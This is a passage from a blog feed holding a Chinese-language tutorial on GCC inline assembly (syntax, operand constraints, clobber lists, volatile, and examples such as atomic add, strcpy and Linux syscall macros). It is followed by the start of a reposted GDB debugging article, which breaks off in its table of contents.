eax,[ebx+3]          |  movl    3(%ebx),%eax              |</span><br><span class="line">| mov     eax,[ebx+20h]        |  movl    0x20(%ebx),%eax           |</span><br><span class="line">| add     eax,[ebx+ecx*2h]     |  addl    (%ebx,%ecx,0x2),%eax      |</span><br><span class="line">| lea     eax,[ebx+ecx]        |  leal    (%ebx,%ecx),%eax          |</span><br><span class="line">| sub     eax,[ebx+ecx*4h-20h] |  subl    -0x20(%ebx,%ecx,0x4),%eax |</span><br><span class="line">+------------------------------+------------------------------------+</span><br></pre></td></tr></table></figure>

<h1 id="基本内联"><a href="#基本内联" class="headerlink" title="基本内联"></a>基本内联</h1><p>基本内联汇编的格式非常直接了当，它的基本格式为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">asm(&quot;汇编代码&quot;);</span><br></pre></td></tr></table></figure>

<p>示例</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">asm</span>(<span class="string">&quot;movl %ecx %eax&quot;</span>);         <span class="comment">/* 将 ecx 寄存器的内容移至 eax  */</span></span><br><span class="line">__asm__(<span class="string">&quot;movb %bh (%eax)&quot;</span>);    <span class="comment">/* 将 bh 的一个字节数据 移至 eax 寄存器指向的内存 */</span></span><br></pre></td></tr></table></figure>
<p><code>asm</code> 和 <code>__asm__</code> 这两者都是有效的，如果关键词 <code>asm</code> 和我们程序的一些标识符冲突了，我们可以使用 <code>__asm__</code>。如果我们的汇编指令有多条时，可以每一条指令一行，并用双引号圈起，同时为每条指令添加 <code>\n\t</code> 后缀。</p>
<p>例如：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">__asm__ (<span class="string">&quot;movl %eax, %ebx\n\t&quot;</span></span><br><span class="line">         <span class="string">&quot;movl $56, %esi\n\t&quot;</span></span><br><span class="line">         <span class="string">&quot;movl %ecx, $label(%edx,%ebx,$4)\n\t&quot;</span></span><br><span class="line">         <span class="string">&quot;movb %ah, (%ebx)&quot;</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<h1 id="扩展汇编"><a href="#扩展汇编" class="headerlink" title="扩展汇编"></a>扩展汇编</h1><p>在基本内联汇编中，我们只有指令，然而在扩展汇编中，我们可以同时指定操作数。操作数允许我们指定输入寄存器、输出寄存器以及修饰寄存器列表。<code>GCC</code> 不强制用户必须指定使用的寄存器。我们可以把头疼的事留给 <code>GCC</code> ，这可能可以更好地适应 <code>GCC</code> 的优化。基本格式为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">asm ( 汇编程序模板</span><br><span class="line">: 输出操作数     /* 可选的 */</span><br><span class="line">: 输入操作数     /* 可选的 */</span><br><span class="line">: 修饰寄存器列表  /* 可选的 */</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<p>汇编程序模板由汇编指令组成。第一个 <code>:</code> 用于将汇编程序模板和第一个输出操作数分开，第二个 <code>:</code> 用于将最后一个输出操作数和第一个输入操作数分开。 <code>,</code> 用于分离每一个组内的操作数，总操作数的数目限制在 <code>10</code> 个，或者机器描述中的任何指令格式中的最大操作数数目，以较大者为准。</p>
<p><strong>如果没有输出操作数但存在输入操作数，你必须将两个连续的冒号放置于输出操作数原本会放置的地方周围。</strong></p>
<p>例如：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">asm</span>(<span class="string">&quot;cld\n\t&quot;</span></span><br><span class="line">    <span class="string">&quot;rep\n\t&quot;</span></span><br><span class="line">    <span class="string">&quot;stosl&quot;</span></span><br><span class="line">    : <span class="comment">/* 无输出寄存器 */</span></span><br><span class="line">    : <span class="string">&quot;c&quot;</span> (count), <span class="string">&quot;a&quot;</span> (fill_value), <span class="string">&quot;D&quot;</span> (dest) <span class="comment">/* 输入操作数 引号中的内容为约束字符串，括号中的内容为被约束的变量 */</span></span><br><span class="line">    : <span class="string">&quot;%ecx&quot;</span>, <span class="string">&quot;%edi&quot;</span> <span class="comment">/* 修饰寄存器列表 */</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<p>以上的内联汇编是将 <code>fill_value</code> 值连续 <code>count</code> 次拷贝到寄存器 <code>edi</code> 所指位置。 它也告诉 <code>gcc</code> 寄存器 <code>ecx</code> 和 <code>edi</code> 将会被修改。</p>
<p>为了更加清晰地说明，让我们再看一个示例。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> a=<span class="number">10</span>, b;</span><br><span class="line"><span class="built_in">asm</span> (<span class="string">&quot;movl %1, %%eax; </span></span><br><span class="line"><span class="string">      movl %%eax, %0;&quot;</span></span><br><span class="line">     :<span class="string">&quot;=r&quot;</span>(b)        <span class="comment">/* 输出 */</span></span><br><span class="line">     :<span class="string">&quot;r&quot;</span>(a)         <span class="comment">/* 输入 */</span></span><br><span class="line">     :<span class="string">&quot;%eax&quot;</span>         <span class="comment">/* 修饰寄存器 */</span></span><br><span class="line">     );   </span><br></pre></td></tr></table></figure>
<p>这里我们所做的是使用汇编指令使 <code>b</code> 变量的值等于 <code>a</code> 变量的值。一些有意思的地方是：</p>
<ol>
<li><p><code>b</code> 为输出操作数，用 <code>%0</code> 引用；<code>a</code> 为输入操作数，用 <code>%1</code> 引用。</p>
</li>
<li><p><code>r</code> 为操作数约束。<code>r</code> 告诉 <code>GCC</code> 可以使用任一寄存器存储操作数。<code>=</code>是一个约束修饰符 ，它表明 <code>b</code> 是一个可写的输出操作数。</p>
</li>
<li><p>寄存器名字以两个 <code>%</code> 为前缀。这有利于 <code>GCC</code> 区分操作数和寄存器，操作数以一个 <code>%</code> 为前缀。</p>
</li>
<li><p>第三个冒号之后的修饰寄存器 <code>%eax</code> 用于告诉 <code>GCC</code> <code>%eax</code> 的值将会在 <code>asm</code> 内部被修改，所以 <code>GCC</code> 将不会使用此寄存器存储任何其他值。</p>
</li>
</ol>
<p>当 <code>asm</code> 执行完毕， <code>b</code> 变量会映射到更新的值，因为它被指定为输出操作数。换句话说， <code>asm</code> 内 <code>b</code> 变量的修改应该会被映射到 <code>asm</code> 外部。</p>
<h2 id="汇编程序模板"><a href="#汇编程序模板" class="headerlink" title="汇编程序模板"></a>汇编程序模板</h2><p>汇编程序模板包含了被插入到 <code>C</code> 程序的汇编指令集。其格式为：</p>
<p>每条指令用双引号圈起，或者整个指令组用双引号圈起。同时每条指令应以分界符结尾。有效的分界符有换行符（<code>\n</code>）和分号（<code>;</code>）。一般使用换行符后会添加一个制表符（<code>\t</code>），原因就是为了排版和分隔。 <code>C</code> 变量对应的操作数使用<code> %0、%1 ... %n-1</code>表示。</p>
<h2 id="操作数"><a href="#操作数" class="headerlink" title="操作数"></a>操作数</h2><p><code>C</code> 变量用作 <code>asm</code> 内的汇编指令操作数。每个操作数前面是以双引号圈起的操作数约束，对于输出操作数，在引号内还有一个额外约束修饰符。约束字符串主要用于决定操作数的寻址方式，同时也用于指定使用的寄存器。</p>
<p>如果我们使用多个操作数，那么每一个操作数用逗号隔开。</p>
<p>在汇编程序模板中，每个操作数用数字引用。编号方式如下，如果总共有 <code>n</code> 个操作数（包括输入和输出操作数），那么第一个输出操作数编号为 <code>0</code> ，逐项递增，并且最后一个输入操作数编号为 <code>n - 1</code> 。</p>
<p>输出操作数变量必须为左值。输入操作数的要求不像这样严格。扩展汇编特性常常用于编译器所不知道的机器指令 。</p>
<p>所以现在我们来关注一些示例。我们想要求一个数的5次方结果。为了计算该值，我们使用 <code>lea</code> 指令。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">asm</span> (<span class="string">&quot;leal (%1,%1,4), %0&quot;</span></span><br><span class="line">     : <span class="string">&quot;=r&quot;</span> (five_times_x)</span><br><span class="line">     : <span class="string">&quot;r&quot;</span> (x) </span><br><span class="line">     );</span><br></pre></td></tr></table></figure>

<p>如果我们想要输入和输出放在同一个寄存器里，我们也可以要求 <code>GCC</code> 这样做。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">asm (&quot;leal (%0,%0,4), %0&quot;</span><br><span class="line">     : &quot;=r&quot; (five_times_x)</span><br><span class="line">     : &quot;0&quot; (x) </span><br><span class="line">     );</span><br></pre></td></tr></table></figure>

<p>现在输出和输出操作数位于同一个寄存器。但是我们无法得知是哪一个寄存器。现在假如我们也想要指定操作数所在的寄存器，这里有一种方法。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">asm (&quot;leal (%%ecx,%%ecx,4), %%ecx&quot;</span><br><span class="line">     : &quot;=c&quot; (x)</span><br><span class="line">     : &quot;c&quot; (x) </span><br><span class="line">     );</span><br></pre></td></tr></table></figure>

<p>在头两个示例， <code>GCC</code> 决定了寄存器并且它知道发生了什么改变。在最后一个示例，我们不必将 <code>ecx</code> 添加到修饰寄存器列表， <code>gcc</code> 知道它表示 <code>x</code> 。因为它可以知道 <code>ecx</code> 的值，它就不被当作修饰的了。</p>
<h2 id="修饰寄存器列表"><a href="#修饰寄存器列表" class="headerlink" title="修饰寄存器列表"></a>修饰寄存器列表</h2><p>一些指令会破坏一些硬件寄存器内容。我们不得不在修饰寄存器中列出这些寄存器，即汇编函数内第三个 <code>:</code> 之后的域。这可以通知 <code>gcc</code> 我们将会自己使用和修改这些寄存器，这样 <code>gcc</code> 就不会假设存入这些寄存器的值是有效的。我们不用在这个列表里列出输入、输出寄存器。因为 <code>gcc</code> 知道 <code>asm</code> 使用了它们。如果指令隐式或显式地使用了任何其他寄存器，（并且寄存器没有出现在输出或者输出约束列表里），那么就需要在修饰寄存器列表中指定这些寄存器。</p>
<p>如果我们的指令可以修改条件码寄存器（ <code>cc</code> ），我们必须将 <code>cc</code> 添加进修饰寄存器列表。</p>
<p>如果我们的指令以不可预测的方式修改了内存，那么需要将 <code>memory</code> 添加进修饰寄存器列表。这可以使 <code>GCC</code> 不会在汇编指令间保持缓存于寄存器的内存值。如果被影响的内存不在汇编的输入或输出列表中，我们也必须添加 <code>volatile</code> 关键词。</p>
<p>我们可以按我们的需求多次读写修饰寄存器。参考一下模板内的多指令示例；它假设子例程 <code>_foo</code> 接受寄存器 <code>eax</code> 和 <code>ecx</code> 里的参数。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">asm</span> (<span class="string">&quot;movl %0,%%eax;</span></span><br><span class="line"><span class="string">      movl %1,%%ecx;</span></span><br><span class="line"><span class="string">      call _foo&quot;</span></span><br><span class="line">     : <span class="comment">/* no outputs */</span></span><br><span class="line">     : <span class="string">&quot;g&quot;</span> (from), <span class="string">&quot;g&quot;</span> (to)</span><br><span class="line">     : <span class="string">&quot;eax&quot;</span>, <span class="string">&quot;ecx&quot;</span></span><br><span class="line">     );</span><br></pre></td></tr></table></figure>

<h2 id="Volatile"><a href="#Volatile" class="headerlink" title="Volatile"></a>Volatile</h2><p>关键词 <code>volatile</code> 放置在 <code>asm</code> 后面、<code>()</code>的前面，以防止编译器优化将指令移动、删除或者其他操作，我们将其声明为 <code>asm volatile ( ... : ... : ... : ...);</code> 。</p>
<p>如果担心发生冲突，请使用 <code>__volatile__</code>。</p>
<p>如果我们的汇编只是用于一些计算并且没有任何副作用，不使用 <code>volatile</code> 关键词会更好。不使用 <code>volatile</code> 关键字 <code>gcc</code> 将会优化代码。</p>
<h1 id="约束"><a href="#约束" class="headerlink" title="约束"></a>约束</h1><p>约束用于表明一个操作数是否可以位于寄存器和位于哪种寄存器；操作数是否可以为一个内存引用和哪种地址；操作数是否可以为一个立即数和它可能的取值范围；等等。</p>
<h2 id="常用约束"><a href="#常用约束" class="headerlink" title="常用约束"></a>常用约束</h2><p>在许多约束中，只有小部分是常用的。我们来看看这些约束。</p>
<ol>
<li>寄存器操作数约束</li>
</ol>
<p>当使用这种约束指定操作数时，它们存储在通用寄存器（ <code>GPR</code> ）中。请看下面示例：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">asm</span> (<span class="string">&quot;movl %%eax, %0\n&quot;</span> :<span class="string">&quot;=r&quot;</span>(myval));</span><br></pre></td></tr></table></figure>

<p>这里，变量 <code>myval</code> 保存在寄存器中，寄存器 <code>eax</code> 的值被复制到该寄存器中，并且 <code>myval</code> 的值从寄存器更新到了内存。当指定 <code>r</code> 约束时， <code>gcc</code> 可以将变量保存在任何可用的 <code>GPR</code> 中。要指定寄存器，你必须使用特定寄存器约束直接地指定寄存器的名字。它们为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+---+--------------------+</span><br><span class="line">| r |    Register(s)     |</span><br><span class="line">+---+--------------------+</span><br><span class="line">| a |   %eax, %ax, %al   |</span><br><span class="line">| b |   %ebx, %bx, %bl   |</span><br><span class="line">| c |   %ecx, %cx, %cl   |</span><br><span class="line">| d |   %edx, %dx, %dl   |</span><br><span class="line">| S |   %esi, %si        |</span><br><span class="line">| D |   %edi, %di        |</span><br><span class="line">+---+--------------------+</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>内存操作数约束</li>
</ol>
<p>当操作数位于内存时，任何对它们的操作将直接发生在内存位置，这与寄存器约束相反，后者首先将值存储在要修改的寄存器中，然后将它写回到内存位置。但寄存器约束通常用于一个指令必须使用它们或者它们可以大大提高处理速度的地方。当需要在 <code>asm</code> 内更新一个 <code>C</code> 变量，而又不想使用寄存器去保存它的值，使用内存最为有效。例如， <code>IDTR</code> 寄存器的值存储于内存位置 <code>loc</code> 处：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">asm</span>(<span class="string">&quot;sidt %0\n&quot;</span> : :<span class="string">&quot;m&quot;</span>(loc));</span><br></pre></td></tr></table></figure>


<ol start="3">
<li>匹配约束</li>
</ol>
<p>在某些情况下，一个变量可能既充当输入操作数，也充当输出操作数。可以通过使用匹配约束在 <code>asm</code> 中指定这种情况。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">asm</span> (<span class="string">&quot;incl %0&quot;</span> :<span class="string">&quot;=a&quot;</span>(var):<span class="string">&quot;0&quot;</span>(var));</span><br></pre></td></tr></table></figure>

<p>在这个匹配约束的示例中，寄存器 <code>%eax</code> 既用作输入变量，也用作输出变量。 <code>var</code> 输入被读进 <code>%eax</code>，并且等递增后更新的 <code>%eax</code> 再次被存储进 <code>var</code> 。这里的 <code>&quot;0&quot;</code> 用于指定与第 <code>0</code> 个输出变量相同的约束。该约束可用于：</p>
<ul>
<li>在输入从变量读取或变量修改后且修改被写回同一变量的情况。</li>
<li>在不需要将输入操作数实例和输出操作数实例分开的情况。</li>
</ul>
<p>使用匹配约束最重要的意义在于它们可以有效地使用可用寄存器。</p>
<p>其他一些约束：</p>
<ul>
<li><code>&quot;m&quot;</code> : 允许一个内存操作数，可以使用机器普遍支持的任一种地址。</li>
<li><code>&quot;o&quot;</code> : 允许一个内存操作数，但只有当地址是可偏移的。即，该地址加上一个小的偏移量可以得到一个有效地址。</li>
<li><code>&quot;V&quot;</code> : 一个不允许偏移的内存操作数。换言之，任何适合 <code>&quot;m&quot;</code> 约束而不适合 <code>&quot;o&quot;</code> 约束的操作数。</li>
<li><code>&quot;i&quot;</code> : 允许一个（带有常量）的立即整形操作数。这包括其值仅在汇编时期知道的符号常量。</li>
<li><code>&quot;n&quot;</code> : 允许一个带有已知数字的立即整形操作数。许多系统不支持汇编时期的常量，因为操作数少于一个字宽。对于此种操作数，约束应该使用 <code>&#39;n&#39;</code> 而不是 <code>&#39;i&#39;</code>。</li>
<li><code>&quot;g&quot;</code> : 允许任一寄存器、内存或者立即整形操作数，不包括通用寄存器之外的寄存器。</li>
</ul>
<p>以下约束为 <code>x86</code> 特有。</p>
<ul>
<li><code>&quot;r&quot;</code> : 寄存器操作数约束，查看上面给定的表格。</li>
<li><code>&quot;q&quot;</code> : 寄存器 <code>a、b、c</code> 或者 <code>d</code> 。</li>
<li><code>&quot;I&quot;</code> : 范围从 <code>0</code> 到 <code>31</code> 的常量（对于 <code>32</code> 位移位）。</li>
<li><code>&quot;J&quot;</code> : 范围从 <code>0</code> 到 <code>63</code> 的常量（对于 <code>64</code> 位移位）。</li>
<li><code>&quot;K&quot;</code> : <code>0xff</code> 。</li>
<li><code>&quot;L&quot;</code> : <code>0xffff</code> 。</li>
<li><code>&quot;M&quot;</code> : <code>0、1、2</code> 或 <code>3</code> （ <code>lea</code> 指令的移位）。</li>
<li><code>&quot;N&quot;</code> : 范围从 <code>0</code> 到 <code>255</code> 的常量（对于 <code>out</code> 指令）。</li>
<li><code>&quot;f&quot;</code> : 浮点寄存器</li>
<li><code>&quot;t&quot;</code> : 第一个（栈顶）浮点寄存器</li>
<li><code>&quot;u&quot;</code> : 第二个浮点寄存器</li>
<li><code>&quot;A&quot;</code> : 指定 <code>&quot;a&quot;</code> 或 <code>&quot;d&quot;</code> 寄存器。这主要用于想要返回 <code>64</code> 位整形数，使用 <code>&quot;d&quot;</code> 寄存器保存最高有效位和 <code>&quot;a&quot;</code> 寄存器保存最低有效位。</li>
</ul>
<h2 id="约束修饰符"><a href="#约束修饰符" class="headerlink" title="约束修饰符"></a>约束修饰符</h2><p>当使用约束时，对于更精确的控制超过了对约束作用的需求，<code>GCC</code> 给我们提供了约束修饰符。最常用的约束修饰符为：</p>
<ul>
<li><code>&quot;=&quot;</code> : 意味着对于这条指令，操作数为可写的；旧值会被忽略并被输出数据所替换。</li>
<li><code>&quot;&amp;&quot;</code> : 意味着这个操作数为一个早期改动的操作数，其在该指令完成前通过使用输入操作数被修改了。因此，这个操作数不可以位于一个被用作输出操作数或任何内存地址部分的寄存器。如果在旧值被写入之前它仅用作输入而已，一个输入操作数可以为一个早期改动操作数。</li>
</ul>
<p>上述只是一些常见的的约束列表和解释。</p>
<h1 id="一些实用的诀窍"><a href="#一些实用的诀窍" class="headerlink" title="一些实用的诀窍"></a>一些实用的诀窍</h1><p>现在我们已经介绍了关于 <code>GCC</code> 内联汇编的基础理论，现在我们将专注于一些简单的例子。将内联汇编函数写成宏的形式总是非常方便的。我们可以在 <code>Linux</code> 内核代码里看到许多汇编函数。（<code>usr/src/linux/include/asm/*.h</code>）。</p>
<p>首先我们从一个简单的例子入手。我们将写一个两个数相加的程序。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> foo = <span class="number">10</span>, bar = <span class="number">15</span>;</span><br><span class="line">    __asm__ __volatile__(<span class="string">&quot;addl  %%ebx,%%eax&quot;</span></span><br><span class="line">                      :<span class="string">&quot;=a&quot;</span>(foo)</span><br><span class="line">                      :<span class="string">&quot;a&quot;</span>(foo), <span class="string">&quot;b&quot;</span>(bar)</span><br><span class="line">                      );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;foo+bar=%d\n&quot;</span>, foo);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里我们要求 <code>GCC</code> 将 <code>foo</code> 存放于 <code>%eax</code>，将 <code>bar</code> 存放于 <code>%ebx</code>，同时我们也想要在 <code>%eax</code> 中存放结果。<code>&quot;=&quot;</code> 符号表示它是一个输出寄存器。现在我们可以以其他方式将一个整数加到一个变量。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">__asm__ __volatile__(</span><br><span class="line">                     <span class="string">&quot;   lock       ;\n&quot;</span></span><br><span class="line">                     <span class="string">&quot;   addl %1,%0 ;\n&quot;</span></span><br><span class="line">                     : <span class="string">&quot;=m&quot;</span>  (my_var)</span><br><span class="line">                     : <span class="string">&quot;ir&quot;</span>  (my_int), <span class="string">&quot;m&quot;</span> (my_var)</span><br><span class="line">                     :                                 <span class="comment">/* 无修饰寄存器列表 */</span></span><br><span class="line">                     );</span><br></pre></td></tr></table></figure>

<p>这是一个原子加法。为了移除原子性，我们可以移除指令 <code>lock</code> 。在输出域中，<code>&quot;=m&quot;</code> 表明 <code>myvar</code> 是一个输出且位于内存。类似地，<code>&quot;ir&quot;</code> 表明 <code>myint</code> 是一个整型，并应该存在于其他寄存器。没有寄存器位于修饰寄存器列表中。</p>
<p>现在我们将在一些寄存器&#x2F;变量上展示一些操作，并比较值。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">__asm__ __volatile__(  <span class="string">&quot;decl %0; sete %1&quot;</span></span><br><span class="line">                     : <span class="string">&quot;=m&quot;</span> (my_var), <span class="string">&quot;=q&quot;</span> (cond)</span><br><span class="line">                     : <span class="string">&quot;m&quot;</span> (my_var) </span><br><span class="line">                     : <span class="string">&quot;memory&quot;</span></span><br><span class="line">                     );</span><br></pre></td></tr></table></figure>

<p>这里，<code>my_var</code> 的值减 <code>1</code> ，并且如果结果的值为 <code>0</code>，则变量 <code>cond</code> 置 <code>1</code> 。我们可以通过将指令 <code>&quot;lock;\n\t&quot;</code> 添加为汇编模板的第一条指令以增加原子性。</p>
<p>这里需要注意的地方是:</p>
<ul>
<li><code>my_var</code> 是一个存储于内存的变量。 </li>
<li><code>cond</code> 位于寄存器 <code>eax、ebx、ecx、edx</code> 中的任何一个。</li>
<li><code>memory</code> 位于修饰寄存器列表中。也就是说，代码将改变内存中的内容。</li>
</ul>
<p>如何置 <code>1</code> 或清 <code>0</code> 寄存器中的一个比特位。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__asm__ __volatile__(   &quot;btsl %1,%0&quot;</span><br><span class="line">                      : &quot;=m&quot; (ADDR)</span><br><span class="line">                      : &quot;Ir&quot; (pos)</span><br><span class="line">                      : &quot;cc&quot;</span><br><span class="line">                      );</span><br></pre></td></tr></table></figure>

<p>这里 <code>ADDR</code> 变量的 <code>pos</code> 位置上的比特被设置为 <code>1</code> 。我们可以使用 <code>btrl</code> 来清除由 <code>btsl</code> 设置的比特位。 <code>pos</code> 的约束 <code>&quot;Ir&quot;</code> 表明 <code>pos</code> 位于寄存器，并且它的值为<code> 0-31</code>。也就是说，我们可以设置&#x2F;清除 <code>ADDR</code> 变量上第 <code>0</code> 到 <code>31</code> 位的任意位。因为条件码会被改变，所以我们将 <code>&quot;cc&quot;</code> 添加进修饰寄存器列表。</p>
<p>现在我们看看一些更为复杂而有用的函数。字符串拷贝。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">char</span> * <span class="title">strcpy</span><span class="params">(<span class="type">char</span> * dest,<span class="type">const</span> <span class="type">char</span> *src)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> d0, d1, d2;</span><br><span class="line">    __asm__ __volatile__(  <span class="string">&quot;1:\tlodsb\n\t&quot;</span></span><br><span class="line">                           <span class="string">&quot;stosb\n\t&quot;</span></span><br><span class="line">                           <span class="string">&quot;testb %%al,%%al\n\t&quot;</span></span><br><span class="line">                           <span class="string">&quot;jne 1b&quot;</span></span><br><span class="line">                         : <span class="string">&quot;=&amp;S&quot;</span> (d0), <span class="string">&quot;=&amp;D&quot;</span> (d1), <span class="string">&quot;=&amp;a&quot;</span> (d2)</span><br><span class="line">                         : <span class="string">&quot;0&quot;</span> (src),<span class="string">&quot;1&quot;</span> (dest) </span><br><span class="line">                         : <span class="string">&quot;memory&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> dest;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>源地址存放于 <code>esi</code>，目标地址存放于 <code>edi</code>，同时开始拷贝，当我们到达 <code>0</code> 时，拷贝完成。约束 <code>&quot;&amp;S&quot;</code>、<code>&quot;&amp;D&quot;</code>、<code>&quot;&amp;a&quot;</code> 表明寄存器 <code>esi、edi</code> 和 <code>eax</code> 早期修饰寄存器，也就是说，它们的内容在函数完成前会被改变。这里很明显可以知道为什么 <code>&quot;memory&quot;</code> 会放在修饰寄存器列表。</p>
<p>我们可以看到一个类似的函数，它能移动双字块数据。注意函数被声明为一个宏。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> mov_blk(src, dest, numwords) \</span></span><br><span class="line"><span class="meta">__asm__ __volatile__ (                                          \</span></span><br><span class="line"><span class="meta">                       <span class="string">&quot;cld\n\t&quot;</span>                                \</span></span><br><span class="line"><span class="meta">                       <span class="string">&quot;rep\n\t&quot;</span>                                \</span></span><br><span class="line"><span class="meta">                       <span class="string">&quot;movsl&quot;</span>                                  \</span></span><br><span class="line"><span class="meta">                       :                                        \</span></span><br><span class="line"><span class="meta">                       : <span class="string">&quot;S&quot;</span> (src), <span class="string">&quot;D&quot;</span> (dest), <span class="string">&quot;c&quot;</span> (numwords)  \</span></span><br><span class="line"><span class="meta">                       : <span class="string">&quot;%ecx&quot;</span>, <span class="string">&quot;%esi&quot;</span>, <span class="string">&quot;%edi&quot;</span>                 \</span></span><br><span class="line"><span class="meta">                       )</span></span><br></pre></td></tr></table></figure>

<p>这里我们没有输出，寄存器 <code>ecx、esi</code>和 <code>edi</code> 的内容发生了改变，这是块移动的副作用。因此我们必须将它们添加进修饰寄存器列表。</p>
<p>在 <code>Linux</code> 中，系统调用使用 <code>GCC</code> 内联汇编实现。让我们看看如何实现一个系统调用。所有的系统调用被写成宏（<code>linux/unistd.h</code>）。例如，带有三个参数的系统调用被定义为如下所示的宏。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">type <span class="title">name</span><span class="params">(type1 arg1,type2 arg2,type3 arg3)</span> \</span></span><br><span class="line"><span class="function"></span>&#123; \</span><br><span class="line"><span class="type">long</span> __res; \</span><br><span class="line"><span class="function">__asm__ <span class="title">volatile</span> <span class="params">(  <span class="string">&quot;int $0x80&quot;</span> \</span></span></span><br><span class="line"><span class="params"><span class="function">                  : <span class="string">&quot;=a&quot;</span> (__res) \</span></span></span><br><span class="line"><span class="params"><span class="function">                  : <span class="string">&quot;0&quot;</span> (__NR_##name),<span class="string">&quot;b&quot;</span> ((<span class="type">long</span>)(arg1)),<span class="string">&quot;c&quot;</span> ((<span class="type">long</span>)(arg2)), \</span></span></span><br><span class="line"><span class="params"><span class="function">                    <span class="string">&quot;d&quot;</span> ((<span class="type">long</span>)(arg3)))</span></span>; \</span><br><span class="line">__syscall_return(type,__res); \</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>无论何时调用带有三个参数的系统调用，以上展示的宏就会用于执行调用。系统调用号位于 <code>eax</code> 中，每个参数位于<code> ebx、ecx、edx</code> 中。最后 <code>&quot;int 0x80&quot;</code> 是一条用于执行系统调用的指令。返回值被存储于 <code>eax</code> 中。</p>
<p>每个系统调用都以类似的方式实现。<code>exit</code> 是一个单一参数的系统调用，让我们看看它的代码看起来会是怎样。它如下所示。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="built_in">asm</span>(<span class="string">&quot;movl $1,%%eax;         /* SYS_exit is 1 */</span></span><br><span class="line"><span class="string">         xorl %%ebx,%%ebx;      /* Argument is in ebx, it is 0 */</span></span><br><span class="line"><span class="string">         int  $0x80&quot;</span>            <span class="comment">/* Enter kernel mode */</span></span><br><span class="line">         );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>exit</code> 的系统调用号是 <code>1</code> ，同时它的参数是 <code>0</code> 。因此我们分配 <code>eax</code> 包含 <code>1</code>，<code>ebx</code> 包含 <code>0</code> ，同时通过 <code>&quot;int $0x80&quot;</code> 执行 <code>&quot;exit(0)&quot;</code>。这就是 <code>exit</code> 的工作原理。</p>
]]></content>
      <categories>
        <category>C++</category>
      </categories>
      <tags>
        <tag>汇编</tag>
      </tags>
  </entry>
  <entry>
    <title>GDB命令基础，让你的程序bug无处躲藏</title>
    <url>/2020/05/05/GDB%E5%91%BD%E4%BB%A4%E5%9F%BA%E7%A1%80%EF%BC%8C%E8%AE%A9%E4%BD%A0%E7%9A%84%E7%A8%8B%E5%BA%8Fbug%E6%97%A0%E5%A4%84%E8%BA%B2%E8%97%8F/</url>
    <content><![CDATA[<blockquote>
<p>转载: <a href="https://deepzz.com/post/gdb-debug.html">https://deepzz.com/post/gdb-debug.html</a></p>
</blockquote>
<!-- TOC -->

<ul>
<li><a href="#%E4%BD%BF%E7%94%A8gdb">使用GDB</a><ul>
<li><a href="#%E5%90%AF%E5%8A%A8">启动</a></li>
<li><a href="#%E8%BF%90%E8%A1%8C">运行</a></li>
<li><a href="#%E8%AE%BE%E7%BD%AE%E6%9F%A5%E7%9C%8B%E6%96%AD%E7%82%B9breakpoint">设置&#x2F;查看断点(breakpoint)</a></li>
<li><a href="#%E8%AE%BE%E7%BD%AE%E6%9F%A5%E7%9C%8B%E8%A7%82%E5%AF%9F%E7%82%B9watchpoint">设置&#x2F;查看观察点(watchpoint)</a></li>
<li><a href="#%E8%AE%BE%E7%BD%AE%E6%9F%A5%E7%9C%8B%E6%8D%95%E6%8D%89%E7%82%B9catchpoint">设置&#x2F;查看捕捉点(catchpoint)</a></li>
<li><a href="#%E7%BB%B4%E6%8A%A4%E5%81%9C%E6%AD%A2%E7%82%B9">维护停止点</a></li>
<li><a href="#%E7%BB%B4%E6%8A%A4%E6%9D%A1%E4%BB%B6%E5%81%9C%E6%AD%A2%E7%82%B9">维护条件停止点</a></li>
<li><a href="#%E5%81%9C%E6%AD%A2%E7%82%B9%E8%AE%BE%E7%BD%AE%E8%BF%90%E8%A1%8C%E5%91%BD%E4%BB%A4">停止点设置运行命令</a></li>
<li><a href="#%E6%96%AD%E7%82%B9%E8%8F%9C%E5%8D%95">断点菜单</a></li>
